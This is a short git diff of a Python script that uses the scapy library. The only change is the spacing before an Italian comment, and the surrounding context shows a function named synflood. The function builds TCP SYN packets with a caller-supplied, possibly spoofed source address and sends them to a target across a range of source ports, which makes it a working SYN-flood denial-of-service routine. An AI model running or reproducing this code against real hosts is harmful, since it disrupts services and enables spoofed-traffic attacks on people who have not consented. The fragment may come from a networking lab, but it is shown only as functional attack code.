@@ -4,7 +4,7 @@ from scapy.volatile import RandShort
 
 
 def synflood(s, d):
-    for sourcePort in range(11000, 11200): # 65000 come finale
+    for sourcePort in range(11000, 11200):  # 65000 come finale
         iplayer = IP(src=s, dst=d)
         tcplayer = TCP(sport=sourcePort, dport=RandShort(), flags="S")
         send(iplayer/tcplayer)
